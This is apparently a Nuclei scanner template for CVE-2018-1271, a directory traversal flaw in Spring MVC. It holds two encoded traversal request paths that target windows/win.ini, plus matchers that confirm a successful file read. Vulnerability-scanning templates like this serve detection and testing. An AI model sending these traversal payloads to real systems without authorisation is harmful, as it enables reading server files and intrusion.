id: CVE-2018-1271

info:
  name: Spring MVC Framework - 本地文件包含(CVE-2018-1271)
  author: hetroublemakr
  severity: medium
  description: Spring MVC Framework versions 5.0 prior to 5.0.5 and versions 4.3 prior to 4.3.15 and older unsupported are vulnerable to local file inclusion because they allow applications to configure Spring MVC to serve static resources (e.g. CSS, JS, images). A malicious user can send a request using a specially crafted URL that can lead a directory traversal attack.
  tags: spring
  metadata:
    max-request: 2

http:
  - method: GET
    path:
      - '{{BaseURL}}/static/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini'
      - '{{BaseURL}}/spring-mvc-showcase/resources/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini'
    matchers-condition: and
    matchers:
      - type: word
        words:
          - 'for 16-bit app support'
      - type: status
        status:
          - 200
